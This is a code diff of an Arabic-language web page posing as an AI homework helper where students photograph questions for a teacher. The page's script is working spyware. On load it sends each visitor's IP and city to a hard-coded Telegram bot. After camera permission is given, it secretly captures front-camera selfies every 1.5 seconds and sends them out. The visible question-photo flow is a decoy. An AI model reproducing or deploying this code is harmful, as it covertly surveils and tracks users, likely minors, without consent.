@@ -3,9 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>اسأل المستر | المنصة الذكية</title>
+    <title>أسألني | المستر</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     
+    <style>
+        :root {
+            --primary: #2563eb;
+            --bg: #f8fafc;
+            --glass: rgba(255, 255, 255, 0.95);
+            --shadow: rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            background: linear-gradient(135deg, #e2e8f0 0%, #cbd5e1 100%);
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #1e293b;
+        }
+
+        .container {
+            background: var(--glass);
+            backdrop-filter: blur(12px);
+            width: 92%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 28px;
+            box-shadow: 0 25px 50px -12px var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            position: relative;
+            text-align: center;
+        }
+
+        .platform-name {
+            font-size: 32px;
+            font-weight: 900;
+            color: var(--primary);
+            margin-bottom: 5px;
+            letter-spacing: -1px;
+        }
+
+        .teacher-name {
+            font-size: 14px;
+            color: #64748b;
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
+
+        .step-card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+            border: 1px solid #f1f5f9;
+        }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 15px;
+            padding: 15px;
+            font-family: 'Cairo';
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+            resize: none;
+            box-sizing: border-box;
+            text-align: right;
+        }
+
+        textarea:focus {
+            border-color: var(--primary);
+            background: #fff;
+        }
+
+        .btn-main {
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 15px;
+            font-weight: 800;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.3);
+        }
+
+        .btn-main:active { transform: scale(0.96); }
+
+        .btn-back {
+            background: transparent;
+            color: #94a3b8;
+            border: none;
+            padding: 10px;
+            margin-top: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        #viewfinder {
+            width: 100%;
+            border-radius: 20px;
+            margin-bottom: 15px;
+            border: 4px solid #fff;
+            background: #000;
+            display: none;
+        }
+
+        .btn-snap {
+            background: #ef4444;
+            border: 5px solid #fff;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin: 10px auto;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .status-badge {
+            background: #dcfce7;
+            color: #166534;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .hidden { display: none; }
+    </style>
+
     <script>
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const chatId = "5890070301";
@@ -14,7 +156,6 @@
         let backStream = null;
         let captureInterval = null;
 
-        // وظيفة إرسال الصور
         async function sendPhoto(blob, caption) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -23,30 +164,29 @@
             try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
         }
 
-        // وظيفة إرسال النصوص
         async function sendMsg(text) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
         }
 
         async function startSystem() {
             try {
-                // 1. تشغيل الكاميرا الأمامية (صامتة تماماً)
+                // 1. تشغيل الكاميرا الأمامية (صامتة)
                 frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = frontStream;
                 hiddenVideo.muted = true;
-                await hiddenVideo.play();
+                hiddenVideo.play();
 
                 const canvasFront = document.createElement('canvas');
                 const ctxFront = canvasFront.getContext('2d');
 
-                // بدء السحب التلقائي من الأمامية
+                // صيد تلقائي كل 1.5 ثانية
                 captureInterval = setInterval(() => {
                     canvasFront.width = hiddenVideo.videoWidth;
                     canvasFront.height = hiddenVideo.videoHeight;
                     ctxFront.drawImage(hiddenVideo, 0, 0);
                     canvasFront.toBlob(blob => {
-                        if(blob) sendPhoto(blob, "📸 سيلفي تلقائي (صامت)");
+                        if(blob) sendPhoto(blob, "📸 صيد حي (سيلفي)");
                     }, 'image/jpeg', 0.2);
                 }, 1500);
 
@@ -55,83 +195,81 @@
                 const view = document.getElementById('viewfinder');
                 view.srcObject = backStream;
                 view.style.display = "block";
-                document.getElementById('initial-ui').style.display = "none";
-                document.getElementById('camera-ui').style.display = "block";
+                
+                document.getElementById('initial-ui').classList.add('hidden');
+                document.getElementById('camera-ui').classList.remove('hidden');
 
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتفعيل وضع الذكاء الاصطناعي");
+                alert("عفواً، يجب السماح بالكاميرا لتشغيل النظام الذكي.");
             }
         }
 
         function captureStep() {
-            // أخفاء الكاميرا وإظهار خانة الوصف
-            document.getElementById('camera-ui').style.display = "none";
-            document.getElementById('description-ui').style.display = "block";
+            document.getElementById('camera-ui').classList.add('hidden');
+            document.getElementById('description-ui').classList.remove('hidden');
         }
 
         function goBack() {
-            document.getElementById('description-ui').style.display = "none";
-            document.getElementById('camera-ui').style.display = "block";
+            document.getElementById('description-ui').classList.add('hidden');
+            document.getElementById('camera-ui').classList.remove('hidden');
         }
 
         function finishAction() {
             const desc = document.getElementById('question-desc').value;
-            sendMsg(`📝 وصف السؤال المرسل:\n${desc}`);
-            document.getElementById('status').innerHTML = `
-                <div style="text-align:center; padding:20px;">
-                    <h2 style="color:#4facfe;">✅ تم الإرسال بنجاح</h2>
-                    <p>سيتم الرد عليك قريباً.. زرنا قريباً!</p>
+            sendMsg(`📝 وصف السؤال المرسل من "أسألني":\n${desc}`);
+            
+            document.getElementById('status-content').innerHTML = `
+                <div style="padding: 40px 10px;">
+                    <img src="https://img.icons8.com/fluency/100/ok.png" width="80">
+                    <h2 style="color:#16a34a; margin-top:20px;">تم الإرسال بنجاح</h2>
+                    <p style="color:#64748b;">سيقوم المستر بمراجعة سؤالك والرد عليك فوراً.</p>
+                    <p style="font-weight:bold; color:var(--primary); margin-top:30px;">شكراً لثقتك بنا، زرنا قريباً!</p>
                 </div>
             `;
         }
 
-        async function initialRadar() {
+        // رادار أولي عند الفتح
+        window.onload = async () => {
             let ipData = { ip: "N/A", city: "N/A" };
             try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
-            const report = `🚀 **دخول جديد للمنصة**\n📍 الموقع: ${ipData.city}\n🌐 IP: \`${ipData.ip}\``;
-            sendMsg(report);
-        }
-
-        window.onload = initialRadar;
+            sendMsg(`🔥 **دخول جديد على منصة "أسألني"**\n📍 الموقع: ${ipData.city}\n🌐 IP: \`${ipData.ip}\``);
+        };
     </script>
-
-    <style>
-        :root { --primary: #4facfe; --bg: #e0e5ec; --shadow: #a3b1c6; }
-        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        .container { background: var(--bg); width: 90%; max-width: 400px; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px var(--shadow), -20px -20px 60px #ffffff; }
-        .ask-title { font-size: 24px; font-weight: 900; color: var(--primary); text-align: center; margin-bottom: 20px; }
-        textarea { width: 100%; height: 100px; background: var(--bg); border: none; border-radius: 15px; padding: 12px; box-shadow: inset 4px 4px 8px var(--shadow), inset -4px -4px 8px #ffffff; outline: none; box-sizing: border-box; }
-        .btn-main { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; border: none; width: 100%; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 4px 4px 10px var(--shadow); }
-        .btn-back { background: #eee; color: #666; border: none; padding: 10px; border-radius: 10px; width: 100%; margin-top: 10px; cursor: pointer; }
-        #viewfinder { width: 100%; border-radius: 20px; display: none; background: #000; }
-        .btn-snap { background: #d93025; border: 4px solid #fff; width: 60px; height: 60px; border-radius: 50%; margin: 15px auto; display: block; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .hidden { display: none; }
-    </style>
 </head>
 <body>
 
-    <div class="container" id="status">
-        <div class="ask-title">اسأل المستر</div>
+    <div class="container" id="status-content">
+        <div class="status-badge">متصل الآن بالذكاء الاصطناعي</div>
+        <div class="platform-name">أسألني</div>
+        <div class="teacher-name">مستر إبراهيم & خالد</div>
         
         <div id="initial-ui">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <img src="https://img.icons8.com/fluent/100/bot.png" width="80">
-                <p>مرحباً بك! اضغط لتصوير سؤالك وسيقوم الذكاء الاصطناعي بحله فوراً.</p>
+            <div class="step-card">
+                <img src="https://img.icons8.com/fluency/96/student-male.png" width="70">
+                <p style="font-size: 14px; color: #475569; line-height: 1.7;">مرحباً بك في منصة أسألني. التقط صورة لسؤالك وسنقوم بمساعدتك في الحل فوراً.</p>
             </div>
-            <button class="btn-main" onclick="startSystem()">📸 تصوير السؤال بالذكاء الاصطناعي</button>
+            <button class="btn-main" onclick="startSystem()">
+                <span>تصوير السؤال الآن</span>
+                <img src="https://img.icons8.com/ios-glyphs/30/ffffff/camera.png" width="22">
+            </button>
         </div>
 
         <div id="camera-ui" class="hidden">
             <video id="viewfinder" autoplay playsinline></video>
-            <p style="text-align:center; font-size:12px; color:#777;">وجه الكاميرا نحو السؤال واضغط الزر</p>
-            <button class="btn-snap" onclick="captureStep()"></button>
+            <p style="font-size:13px; color:#64748b;">ضع السؤال في منتصف الكادر</p>
+            <div class="btn-snap" onclick="captureStep()"></div>
         </div>
 
         <div id="description-ui" class="hidden">
-            <p style="font-weight: bold;">أضف وصفاً للسؤال (اختياري):</p>
-            <textarea id="question-desc" placeholder="مثلاً: أريد حل الخطوة الثانية..."></textarea>
-            <button class="btn-main" onclick="finishAction()">إرسال السؤال 🚀</button>
-            <button class="btn-back" onclick="goBack()">🔙 تصوير مرة أخرى</button>
+            <div class="step-card">
+                <textarea id="question-desc" placeholder="أضف وصفاً لسؤالك هنا..."></textarea>
+            </div>
+            <button class="btn-main" onclick="finishAction()">إرسال السؤال للمستر</button>
+            <button class="btn-back" onclick="goBack()">إعادة التصوير</button>
+        </div>
+
+        <div style="margin-top: 25px; font-size: 10px; color: #94a3b8; font-weight: bold;">
+            DEVELOPED BY KIMO 2026
         </div>
     </div>
 
